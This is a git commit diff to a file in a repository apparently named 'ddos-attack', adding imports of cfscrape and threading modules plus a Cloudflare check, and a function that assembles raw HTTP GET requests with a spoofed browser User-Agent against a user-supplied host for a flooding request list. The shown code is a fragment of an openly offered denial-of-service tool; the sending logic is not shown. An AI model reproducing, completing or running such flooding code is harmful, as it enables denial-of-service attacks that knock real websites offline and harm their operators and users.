4e0501c2077b3a99dc9010db610700f7ab5dc001
besartakurtaj <93934264+besartakurtaj@users.noreply.github.com>
2023-01-07 16:56:11 +0100

    Update main.py

--- ddos-attack/main.py
+++ ddos-attack/main.py
@@ -1,3 +1,11 @@
+import cfscrape
+import _thread, threading, random
+from inspect import currentframe, getframeinfo
+from usage_commands import usage
+from cloudflare_check import cloudflare
+from time import sleep
+
+
 # Creation of http request is cloudflare = True
 def set_request_cf():
     global request_cf
@@ -15,3 +23,13 @@ def set_request_cf():
     connection = "Connection: Keep-Alive\r\n"
     request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n" 
     
+# Creation of http request is cloudflare = False
+def set_request():
+    global request
+    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    useragent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n"
+    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    request = get_host + useragent + accept + \
+              connection + "\r\n"
+    request_list.append(request)
